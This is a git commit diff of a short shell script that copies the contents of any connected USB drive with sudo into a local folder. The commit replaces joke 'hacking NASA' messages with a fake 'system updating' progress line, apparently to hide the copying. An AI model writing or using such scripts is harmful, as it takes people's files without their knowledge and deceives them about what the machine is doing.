2f9d43960bcecd1bd0240efd30f3970a4b62ac56
Sanfeire <67929659+Sanfeire@users.noreply.github.com>
2021-10-13 21:11:13 +0100

    Update main.sh

--- main.sh
+++ main.sh
@@ -8,21 +8,7 @@ then
   echo Thers a USB connected, copying..    
   sudo cp -r $FILE /home/santi/basededatosusb/$RANDOM
 else
-  echo Thers not any USB... Sorry
-  sleep 3
-  echo hacking NASA 20%...
-  sleep 2
-  echo hacking NASA 45,3%...
-  sleep 2
-  echo hacking NASA 66,6%...
-  sleep 4
-  echo hacking NASA 80,6%...
-  sleep 2
-  echo The attack was compleated succesfully
-  sleep 4
-  echo now you can see the database of the Perseverance mission
-  sleep 2
-  echo I wish you luck with the FBI
+  echo "Actualizando o sistema... 33% completado"
 fi
 #cambiar por el usuario, atento la línea del copiado (revisa antes que aparece)
 sleep 40
